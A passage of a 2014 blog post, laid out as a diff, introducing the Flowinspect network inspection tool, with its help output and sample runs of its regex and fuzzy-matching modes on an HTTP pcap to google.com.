@@ -1,0 +1,717 @@
+Flowinspect: A Network Inspection Tool
+======================================
+date: 27/Nov/2014
+summary: This post introduces a network inspection tool that I've developed, called Flowinspect. It aims to reassemble network data and scan it via different inspection engines. Results of these scan can be viewed as a HTML report or consumed as a JSON via external applications.
+tags: code, shellcode
+
+For last couple of months I've been working on a network inspection tool, Flowinspect. I was honored to be able to present it at [Nullcon 2014](http://nullcon.net/website/goa-14/speakers/ankur-tyagi.php) and [Black Hat USA 2014 Arsenal](https://www.blackhat.com/us-14/arsenal.html#Tyagi). It started as an internal tool that proved useful for me and my colleagues at Juniper Networks for our signature development tasks. However, within just few months of inception, it started taking shape of a generic network inspection utility that allows automation of a number of tasks. It is opensource, released under the [CC BY NC SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) license terms and available on [Github](https://github.com/7h3rAm/flowinspect).
+
+At its core, Flowinspect uses [libnids](http://libnids.sourceforge.net/) and its Python binding [pynids](http://jon.oberheide.org/pynids/) to defragment IP and reassemble TCP packets. The result of this operation results in the generation of a TCP stream that can then be either dumped to file, saved as a pcap, analyzed via multiple inspection engines, etc.
+
+Here's a brief summary of available options:
+
+```shell
+$ ./flowinspect.py -h
+        ______              _                            __
+       / __/ /___ _      __(_)___  _________  ___  _____/ /_
+      / /_/ / __ \ | /| / / / __ \/ ___/ __ \/ _ \/ ___/ __/
+     / __/ / /_/ / |/ |/ / / / / (__  ) /_/ /  __/ /__/ /_
+    /_/ /_/\____/|__/|__/_/_/ /_/____/ .___/\___/\___/\__/
+                                    /_/
+
+          flowinspect - A network inspection tool
+          Ankur Tyagi (7h3rAm)
+
+usage: flowinspect.py [-h] (-p --pcap | -d --device) [-c --cregex]
+                      [-s --sregex] [-a --aregex] [-i] [-m] [-G --cfuzz]
+                      [-H --sfuzz] [-I --afuzz] [-r fuzzminthreshold]
+                      [-P --cyararules] [-Q --syararules] [-R --ayararules]
+                      [-M] [-J] [-y] [-Y --emuprofileoutsize] [-O --offset]
+                      [-D --depth] [-T --maxinspstreams] [-U --maxinsppackets]
+                      [-t --maxdispstreams] [-u --maxdisppackets]
+                      [-b --maxdispbytes] [-w [logdir]]
+                      [-o {quite,meta,hex,print,raw}] [-f --bpf] [-v] [-V]
+                      [-e] [-k] [-j] [-z | -Z] [-q pcappacketct] [-L] [-B]
+                      [-S] [-n]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -p --pcap             input pcap file
+  -d --device           listening device
+  -z                    write matching flows to pcap w/ 5 post match packets
+  -Z                    write matching flows to pcap w/ all post match packets
+
+RegEx per Direction:
+  -c --cregex           regex to match against CTS data
+  -s --sregex           regex to match against STC data
+  -a --aregex           regex to match against ANY data
+
+RegEx Options:
+  -i                    ignore case
+  -m                    disable multiline match
+
+Fuzzy Patterns per Direction:
+  -G --cfuzz            string to fuzzy match against CTS data
+  -H --sfuzz            string to fuzzy match against STC data
+  -I --afuzz            string to fuzzy match against ANY data
+
+Fuzzy Options:
+  -r fuzzminthreshold   threshold for fuzzy match (1-100) - default 75
+
+Yara Rules per Direction:
+  -P --cyararules       Yara rules to match on CTS data
+  -Q --syararules       Yara rules to match on STC data
+  -R --ayararules       Yara rules to match on ANY data
+
+Shellcode Detection:
+  -M                    enable shellcode detection
+  -J                    enable shellcode disassembly
+  -y                    generate emulator profile for detected shellcode
+  -Y --emuprofileoutsize
+                        emulator profile memory size (default 1024K | max:
+                        10240K)
+
+Content Modifiers:
+  -O --offset           bytes to skip before matching
+  -D --depth            bytes to look at while matching (starting from offset)
+
+Inspection Limits:
+  -T --maxinspstreams   max streams to inspect
+  -U --maxinsppackets   max packets to inspect
+
+Display Limits:
+  -t --maxdispstreams   max streams to display
+  -u --maxdisppackets   max packets to display
+  -b --maxdispbytes     max bytes to display
+
+Output Options:
+  -w [logdir]           write matching packets/streams
+  -o {quite,meta,hex,print,raw}
+                        match output modes
+
+Misc. Options:
+  -f --bpf              BPF expression
+  -v                    invert match
+  -V                    verbose output (max: 3)
+  -e                    highlight CTS/STC matches
+  -k                    kill matching TCP stream
+  -j                    enable TCP multi match mode
+  -q pcappacketct       # of post match packets to write to pcap
+  -L                    enable linemode (disables inspection)
+  -B                    skip banner/version display on startup
+  -S                    skip match summary display at exit
+  -n                    show argument stats
+```
+
+There are two modes of input: a pcap file or an interface name for live network traffic inspection. Let's try a pcap file that has HTTP trace for `google.com`:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap
+[27-Nov-2014 09:35:10.920648 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 09:35:10.921427 IST] [handletcp] NORM: [IP#1.TCP#1] Skipping inspection as linemode is enabled.
+[MATCH] (00000001/00000000) [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80
+[MATCH] (00000001/00000000) [IP#1.TCP#1] match @ CTS[0:627] (627B)
+00000000:  47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a   |GET / HTTP/1.1..|
+00000010:  48 6f 73 74 3a 20 77 77 77 2e 67 6f 6f 67 6c 65   |Host: www.google|
+00000020:  2e 63 6f 6d 0d 0a 55 73 65 72 2d 41 67 65 6e 74   |.com..User-Agent|
+00000030:  3a 20 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 57   |: Mozilla/5.0 (W|
+00000040:  69 6e 64 6f 77 73 3b 20 55 3b 20 57 69 6e 64 6f   |indows; U; Windo|
+00000050:  77 73 20 4e 54 20 36 2e 31 3b 20 65 6e 2d 55 53   |ws NT 6.1; en-US|
+00000060:  3b 20 72 76 3a 31 2e 39 2e 31 2e 37 29 20 47 65   |; rv:1.9.1.7) Ge|
+00000070:  63 6b 6f 2f 32 30 30 39 31 32 32 31 20 46 69 72   |cko/20091221 Fir|
+00000080:  65 66 6f 78 2f 33 2e 35 2e 37 0d 0a 41 63 63 65   |efox/3.5.7..Acce|
+00000090:  70 74 3a 20 74 65 78 74 2f 68 74 6d 6c 2c 61 70   |pt: text/html,ap|
+000000a0:  70 6c 69 63 61 74 69 6f 6e 2f 78 68 74 6d 6c 2b   |plication/xhtml+|
+000000b0:  78 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e 2f   |xml,application/|
+000000c0:  78 6d 6c 3b 71 3d 30 2e 39 2c 2a 2f 2a 3b 71 3d   |xml;q=0.9,*/*;q=|
+000000d0:  30 2e 38 0d 0a 41 63 63 65 70 74 2d 4c 61 6e 67   |0.8..Accept-Lang|
+000000e0:  75 61 67 65 3a 20 65 6e 2d 75 73 2c 65 6e 3b 71   |uage: en-us,en;q|
+000000f0:  3d 30 2e 35 0d 0a 41 63 63 65 70 74 2d 45 6e 63   |=0.5..Accept-Enc|
+00000100:  6f 64 69 6e 67 3a 20 67 7a 69 70 2c 64 65 66 6c   |oding: gzip,defl|
+00000110:  61 74 65 0d 0a 41 63 63 65 70 74 2d 43 68 61 72   |ate..Accept-Char|
+00000120:  73 65 74 3a 20 49 53 4f 2d 38 38 35 39 2d 31 2c   |set: ISO-8859-1,|
+00000130:  75 74 66 2d 38 3b 71 3d 30 2e 37 2c 2a 3b 71 3d   |utf-8;q=0.7,*;q=|
+00000140:  30 2e 37 0d 0a 4b 65 65 70 2d 41 6c 69 76 65 3a   |0.7..Keep-Alive:|
+00000150:  20 33 30 30 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e   | 300..Connection|
+00000160:  3a 20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 43 6f   |: keep-alive..Co|
+00000170:  6f 6b 69 65 3a 20 50 52 45 46 3d 49 44 3d 32 35   |okie: PREF=ID=25|
+00000180:  37 39 31 33 61 39 33 38 65 36 63 32 34 38 3a 55   |7913a938e6c248:U|
+00000190:  3d 32 36 37 63 38 39 36 62 35 66 33 39 66 62 30   |=267c896b5f39fb0|
+000001a0:  62 3a 46 46 3d 34 3a 4c 44 3d 65 6e 3a 4e 52 3d   |b:FF=4:LD=en:NR=|
+000001b0:  31 30 3a 54 4d 3d 31 32 36 30 37 33 30 36 35 34   |10:TM=1260730654|
+000001c0:  3a 4c 4d 3d 31 32 36 35 34 37 39 33 33 36 3a 47   |:LM=1265479336:G|
+000001d0:  4d 3d 31 3a 53 3d 68 31 55 42 47 6f 6e 54 75 57   |M=1:S=h1UBGonTuW|
+000001e0:  55 33 44 32 33 4c 3b 20 4e 49 44 3d 33 31 3d 5a   |U3D23L; NID=31=Z|
+000001f0:  2d 6e 68 77 4d 6a 55 50 36 33 65 30 74 59 4d 54   |-nhwMjUP63e0tYMT|
+00000200:  70 2d 33 54 31 69 67 4d 53 50 6e 4e 53 31 65 4d   |p-3T1igMSPnNS1eM|
+00000210:  31 6b 4e 31 5f 44 55 72 6e 4f 32 7a 57 31 63 50   |1kN1_DUrnO2zW1cP|
+00000220:  4d 34 4a 45 33 41 4a 65 63 39 62 5f 76 47 2d 59   |M4JE3AJec9b_vG-Y|
+00000230:  46 69 62 46 58 73 7a 4f 41 70 66 62 68 42 41 31   |FibFXszOApfbhBA1|
+00000240:  42 4f 58 34 64 4b 78 34 4c 38 5a 44 64 65 69 4b   |BOX4dKx4L8ZDdeiK|
+00000250:  77 71 65 6b 67 50 35 5f 6b 7a 45 4c 74 43 32 6d   |wqekgP5_kzELtC2m|
+00000260:  55 48 78 37 52 48 78 33 50 49 74 74 63 75 5a 0d   |UHx7RHx3PIttcuZ.|
+00000270:  0a 0d 0a                                          |...|
+
+[27-Nov-2014 09:35:10.926528 IST] [handletcp] NORM: [IP#1.TCP#1] Skipping inspection as linemode is enabled.
+[MATCH] (00000002/00000000) [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80
+[MATCH] (00000002/00000000) [IP#1.TCP#1] match @ STC[0:1406] (1406B)
+00000000:  48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d   |HTTP/1.1 200 OK.|
+00000010:  0a 44 61 74 65 3a 20 54 75 65 2c 20 30 39 20 46   |.Date: Tue, 09 F|
+00000020:  65 62 20 32 30 31 30 20 30 31 3a 31 38 3a 33 37   |eb 2010 01:18:37|
+00000030:  20 47 4d 54 0d 0a 45 78 70 69 72 65 73 3a 20 2d   | GMT..Expires: -|
+00000040:  31 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 6f 6c   |1..Cache-Control|
+00000050:  3a 20 70 72 69 76 61 74 65 2c 20 6d 61 78 2d 61   |: private, max-a|
+00000060:  67 65 3d 30 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79   |ge=0..Content-Ty|
+00000070:  70 65 3a 20 74 65 78 74 2f 68 74 6d 6c 3b 20 63   |pe: text/html; c|
+00000080:  68 61 72 73 65 74 3d 55 54 46 2d 38 0d 0a 43 6f   |harset=UTF-8..Co|
+00000090:  6e 74 65 6e 74 2d 45 6e 63 6f 64 69 6e 67 3a 20   |ntent-Encoding: |
+000000a0:  67 7a 69 70 0d 0a 53 65 72 76 65 72 3a 20 67 77   |gzip..Server: gw|
+000000b0:  73 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74   |s..Content-Lengt|
+000000c0:  68 3a 20 34 36 33 33 0d 0a 58 2d 58 53 53 2d 50   |h: 4633..X-XSS-P|
+000000d0:  72 6f 74 65 63 74 69 6f 6e 3a 20 30 0d 0a 0d 0a   |rotection: 0....|
+000000e0:  1f 8b 08 00 00 00 00 00 02 ff ad 3a 6b 57 db ba   |...........:kW..|
+000000f0:  b2 df fb 2b 8c b9 0d f6 c1 38 0f ca 2b 46 74 01   |...+.....8..+Ft.|
+<snipped>
+
+[27-Nov-2014 09:35:10.930391 IST] [handletcp] NORM: [IP#1.TCP#1] Skipping inspection as linemode is enabled.
+[MATCH] (00000003/00000000) [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80
+[MATCH] (00000003/00000000) [IP#1.TCP#1] match @ STC[1406:2812] (1406B)
+00000000:  a5 02 0b db 75 d1 be ab 38 66 95 33 81 d7 0e a0   |....u...8f.3....|
+00000010:  5c 49 67 94 86 ce 5d 8c 00 fd 55 47 40 18 12 e1   |.Ig...]...UG@...|
+00000020:  67 37 8a 67 e3 d1 ff c1 ea 9b d6 94 5c bd 42 4f   |g7.g..........BO|
+00000030:  3e 31 a9 dc fa 9d 61 48 ca 0c 65 95 91 1f e1 7d   |>1....aH..e....}|
+00000040:  47 93 29 db 26 02 cb 0c 52 e6 99 42 c5 5f 3d 0d   |G.).&...R..B._=.|
+00000050:  b2 98 6e 71 4f b3 f7 48 a3 cc ec 15 b4 ac 6f 67   |..nqO..H......og|
+00000060:  79 0a 82 d5 ec d5 a6 40 ac 6b ff 7e aa e9 77 a4   |y......@.k.~..w.|
+<snipped>
+
+[27-Nov-2014 09:35:10.933283 IST] [handletcp] NORM: [IP#1.TCP#1] Skipping inspection as linemode is enabled.
+[MATCH] (00000004/00000000) [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80
+[MATCH] (00000004/00000000) [IP#1.TCP#1] match @ STC[2812:4218] (1406B)
+00000000:  28 aa 22 91 5c 9e 89 ba 44 0b 8a d2 4c 9e 06 fd   |(.".....D...L...|
+00000010:  13 86 3c 24 69 cc 58 86 b2 eb 80 0f b1 74 5a c1   |..<$i.X......tZ.|
+00000020:  61 95 bb 37 81 da 29 90 81 c5 13 c8 72 f8 36 f4   |a..7..).....r.6.|
+00000030:  13 30 2d 28 c4 a0 f2 87 fd 94 94 a5 aa 14 15 77   |.0-(...........w|
+00000040:  b3 d9 90 85 6d 69 52 b7 fb 67 67 65 dd 8e 35 bb   |....miR..gge..5.|
+00000050:  e9 73 a8 20 a4 71 b4 b6 36 05 45 00 4f ca e0 62   |.s. .q..6.E.O..b|
+00000060:  53 14 c6 21 9e a0 87 a2 e8 15 f5 22 fc e3 49 ab   |S..!......."..I.|
+<snipped>
+
+[27-Nov-2014 09:35:10.952326 IST] [handletcp] NORM: [IP#1.TCP#1] Skipping inspection as linemode is enabled.
+[MATCH] (00000005/00000000) [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80
+[MATCH] (00000005/00000000) [IP#1.TCP#1] match @ STC[4218:4320] (102B)
+00000000:  d4 1c 83 95 86 09 e6 5b 7e 62 62 93 86 e1 5a 2e   |.......[~bb...Z.|
+00000010:  71 ae 6d f1 85 88 c0 f0 c8 4b 3a 76 81 24 de e2   |q.m......K:v.$..|
+00000020:  c9 a9 f5 71 95 4c c7 ea 10 56 90 a1 84 42 52 8d   |...q.L...V...BR.|
+00000030:  20 0a 6b 3d ad 03 e1 ce c0 b8 aa eb d5 79 2d 7a   | .k=.........y-z|
+00000040:  6d df 58 80 af e3 0f 72 8d ad a1 16 17 99 aa d1   |m.X....r........|
+00000050:  30 9a f0 af aa 93 ab 32 3a bd b8 eb cd ae c6 10   |0......2:.......|
+00000060:  ab 30 16 b2 5d 89                                 |.0..].|
+
+[27-Nov-2014 09:35:10.952831 IST] [handletcp] NORM: [IP#1.TCP#1] Skipping inspection as linemode is enabled.
+[MATCH] (00000006/00000000) [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80
+[MATCH] (00000006/00000000) [IP#1.TCP#1] match @ STC[4320:4857] (537B)
+00000000:  be 8e 9c 1e 56 eb 15 6c ba a6 a8 a2 f0 2d 21 6f   |....V..l.....-!o|
+00000010:  d8 64 65 ae 3e 9d b4 2a d5 89 b0 1d 71 87 56 be   |.de.>..*....q.V.|
+00000020:  ba af d5 b8 3e 12 1f 21 15 61 41 9c 31 5a c8 1f   |....>..!.aA.1Z..|
+00000030:  03 b5 d3 59 35 ae 75 d1 09 9c 5a cd 31 45 d9 4b   |...Y5.u...Z.1E.K|
+00000040:  d4 c9 17 6e 6a 79 ff ea 00 67 1c 68 fc 32 dc c9   |...njy...g.h.2..|
+00000050:  ef df 16 23 9a ff f4 14 e8 b5 9a e6 2f 11 1b 7e   |...#......../..~|
+00000060:  2e 11 17 af 55 f7 36 1b 0d cb 27 b6 15 10 77 0c   |....U.6...'...w.|
+<snipped>
+
+[27-Nov-2014 09:35:10.953561 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 09:35:10.953620 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+
+[27-Nov-2014 09:35:10.953669 IST] [doexit] NORM: Session completed in 0:00:00.097070. Exiting.
+```
+
+With the default options, Flowinspect will trace all TCP sessions from the input pcap and show a hexdump summary on a per packet basis. As can be seen from the output above, there is just one TCP session in the input pcap. The data sent by the client to the server is labelled as CTS (Client-to-Server) and that sent by the server in response is labelled as STC (Server-to-Client). In the last hexdump output, the second MATCH line shows that the STC buffer is of size 4857B, ie, the server replied with ~4.7KB of data for the initial request which was of size 627B.
+
+## Regex Inspection Mode
+Each of the inspection engines are triggered once the `libnids` engine completes reassembly and provides CTS/STC buffers per session. These buffers are then passed on to respective inspection engines. Let's now have a look at each of the inspection mode options, starting with regex mode first. Here's a listing of options available for regex mode inspection:
+
+```shell
+RegEx per Direction:
+  -c --cregex           regex to match against CTS data
+  -s --sregex           regex to match against STC data
+  -a --aregex           regex to match against ANY data
+
+RegEx Options:
+  -i                    ignore case
+  -m                    disable multiline match
+```
+
+The first three options allow users to specify regular expressions that will be matched upon respective TCP stream buffers. So let's assume you wish to find all HTTP requests initiated by `Firefox`. From the [UserAgentStrings.com](http://www.useragentstring.com/pages/Firefox/) listing for Firefox browser, we know that each such request will start with either `Mozilla/5.0` or `Mozilla/6.0` which can be shortened to `Mozilla/[56]\.0` regex:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -c 'Mozilla/[56]\.0'
+[27-Nov-2014 09:59:08.385845 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 matches regex: 'Mozilla/[56]\.0'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[50:61] (11B | packet[4] - packet[4])
+00000000:  4d 6f 7a 69 6c 6c 61 2f 35 2e 30                  |Mozilla/5.0|
+
+[27-Nov-2014 09:59:08.387225 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 09:59:08.387584 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 11B (#1), Longest: 11B (#1) }}
+
+[27-Nov-2014 09:59:08.387902 IST] [doexit] NORM: Session completed in 0:00:00.017678. Exiting.
+```
+
+So we find a match of 11B within the CTS stream for `172.16.16.128:1606 - 74.125.95.104:80` TCP session. Another interesting thing to nte in this output is that the match was found within packet #4 itself. Flowinspect will perform a reverse calculation to identify packet boundaries per match. This is an extremely useful feature for those cases when you have millions of packets to scan and even after finding a match you are left clueless about the packet offset.
+
+If you provide multiple regexes per direction, Flowinspect will match them upon streams as new packets arrive and reassembly completes. This means that if you provide both CTS/STC regexes and STC packets arrive first, then it will inspect STC regexes first. Additionally, Flowinspect will also inherently stop inspection on the first match. This is a performance optimization with the assumption that the first match signifies that what you were looking for within the network stream has been found (although partially) and as such there is no need to scan further. However, considering the fact that this behavior might not suffice everyone's need, there's a `multi match` mode that is enabled via the `-j` option and performs inspection even after we find a match. This mode will also help you find all the matches for an input expression within the network stream.
+
+Regex mode also provides two options `-i` and `-m` to ignore case and disable multiline matches:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -c 'mozilla/[56]\.0'
+[27-Nov-2014 11:13:27.451806 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:13:27.452312 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:13:27.452509 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+
+[27-Nov-2014 11:13:27.452731 IST] [doexit] NORM: Session completed in 0:00:00.018524. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -c 'mozilla/[56]\.0' -i
+[27-Nov-2014 11:13:30.960334 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 matches regex: 'mozilla/[56]\.0'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[50:61] (11B | packet[4] - packet[4])
+00000000:  4d 6f 7a 69 6c 6c 61 2f 35 2e 30                  |Mozilla/5.0|
+
+[27-Nov-2014 11:13:30.961976 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:13:30.962121 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 11B (#1), Longest: 11B (#1) }}
+
+[27-Nov-2014 11:13:30.962186 IST] [doexit] NORM: Session completed in 0:00:00.016381. Exiting.
+```
+
+## Fuzzy String Inspection Mode
+The second inspection mode is Fuzzy string matching that allows inspection via similarity matches rather than exact matches. Fuzzy string matching allows to specify a threshold which can be compared against a match ration between two strings. If the ration satisfies the threshold, the match is considered to be valid else not. Let's assume you wish to find all strings similar to `http`:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -G 'http' -V
+[27-Nov-2014 11:18:34.928901 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:18:34.929290 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 [NEW] { TRACKED: 1 }
+[27-Nov-2014 11:18:34.929504 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled CTS data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:18:34.929761 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 [627B] { CTS: 627, STC: 0, TOT: 627 }
+[27-Nov-2014 11:18:34.929933 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on CTS[0:627] - 627B
+[27-Nov-2014 11:18:34.930230 IST] [inspect] INFO: [IP#1.TCP#1] Received 627B for inspection from 172.16.16.128:1606 -> 74.125.95.104:80
+[27-Nov-2014 11:18:34.930506 IST] [inspect] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 doesnot match 'http' (ratio: 50 < threshold: 75)
+
+[27-Nov-2014 11:18:34.930900 IST] [dumpopenstreams] INFO: Dumping open/tracked TCP streams: 1
+[27-Nov-2014 11:18:34.931113 IST] [dumpopenstreams] INFO: [00000001] 172.16.16.128:1606 - 74.125.95.104:80 { CTS: 627B, STC: 4857B, TOT: 5484B }
+
+[27-Nov-2014 11:18:34.931286 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:18:34.931287 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+
+[27-Nov-2014 11:18:34.931867 IST] [doexit] NORM: Session completed in 0:00:00.019189. Exiting.
+```
+
+The `-V` option increases verbosity and the output shows that Flowinspect found a match, but since ratio (50%) was below the default threshold (75%), it was ignored. You can try different strings or change the default threshold for testing purposes:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -G 'hTTp' -V -b32
+[27-Nov-2014 11:22:44.919888 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:22:44.920530 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 [NEW] { TRACKED: 1 }
+[27-Nov-2014 11:22:44.921073 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled CTS data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:22:44.921394 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 [627B] { CTS: 627, STC: 0, TOT: 627 }
+[27-Nov-2014 11:22:44.921585 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on CTS[0:627] - 627B
+[27-Nov-2014 11:22:44.921707 IST] [inspect] INFO: [IP#1.TCP#1] Received 627B for inspection from 172.16.16.128:1606 -> 74.125.95.104:80
+[27-Nov-2014 11:22:44.923321 IST] [inspect] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 doesnot match 'hTTp' (ratio: 50 < threshold: 75)
+
+[27-Nov-2014 11:22:44.923782 IST] [dumpopenstreams] INFO: Dumping open/tracked TCP streams: 1
+[27-Nov-2014 11:22:44.923881 IST] [dumpopenstreams] INFO: [00000001] 172.16.16.128:1606 - 74.125.95.104:80 { CTS: 627B, STC: 4857B, TOT: 5484B }
+
+[27-Nov-2014 11:22:44.924025 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:22:44.924111 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+
+[27-Nov-2014 11:22:44.924552 IST] [doexit] NORM: Session completed in 0:00:00.028718. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -G 'hTTP' -V -b32
+[27-Nov-2014 11:22:52.258303 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:22:52.258539 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 [NEW] { TRACKED: 1 }
+[27-Nov-2014 11:22:52.258701 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled CTS data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:22:52.258866 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 [627B] { CTS: 627, STC: 0, TOT: 627 }
+[27-Nov-2014 11:22:52.259011 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on CTS[0:627] - 627B
+[27-Nov-2014 11:22:52.259128 IST] [inspect] INFO: [IP#1.TCP#1] Received 627B for inspection from 172.16.16.128:1606 -> 74.125.95.104:80
+[27-Nov-2014 11:22:52.259542 IST] [inspect] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 doesnot match 'hTTP' (ratio: 25 < threshold: 75)
+
+[27-Nov-2014 11:22:52.259896 IST] [dumpopenstreams] INFO: Dumping open/tracked TCP streams: 1
+[27-Nov-2014 11:22:52.260022 IST] [dumpopenstreams] INFO: [00000001] 172.16.16.128:1606 - 74.125.95.104:80 { CTS: 627B, STC: 4857B, TOT: 5484B }
+
+[27-Nov-2014 11:22:52.260084 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:22:52.260608 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+
+[27-Nov-2014 11:22:52.260818 IST] [doexit] NORM: Session completed in 0:00:00.021450. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -G 'HTTP' -V -b32
+[27-Nov-2014 11:22:59.122314 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:22:59.122810 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 [NEW] { TRACKED: 1 }
+[27-Nov-2014 11:22:59.122976 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled CTS data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:22:59.123240 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 [627B] { CTS: 627, STC: 0, TOT: 627 }
+[27-Nov-2014 11:22:59.123301 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on CTS[0:627] - 627B
+[27-Nov-2014 11:22:59.123301 IST] [inspect] INFO: [IP#1.TCP#1] Received 627B for inspection from 172.16.16.128:1606 -> 74.125.95.104:80
+[27-Nov-2014 11:22:59.123779 IST] [inspect] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 matches 'HTTP' (ratio: 100 >= threshold: 75)
+[27-Nov-2014 11:22:59.124808 IST] [showtcpmatches] INFO: [IP#1.TCP#1] BPF: (ip.src == 172.16.16.128 and tcp.srcport == 1606) and (ip.dst == 74.125.95.104 and tcp.dstport == 80)
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 matches 'HTTP' (ratio: 100 >= threshold: 75)
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[0:627] (627B | packet[4] - packet[4])
+00000000:  47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a   |GET / HTTP/1.1..|
+00000010:  48 6f 73 74 3a 20 77 77 77 2e 67 6f 6f 67 6c 65   |Host: www.google|
+
+[27-Nov-2014 11:22:59.126556 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 not being tracked any further { tcpmultimatch: False }
+
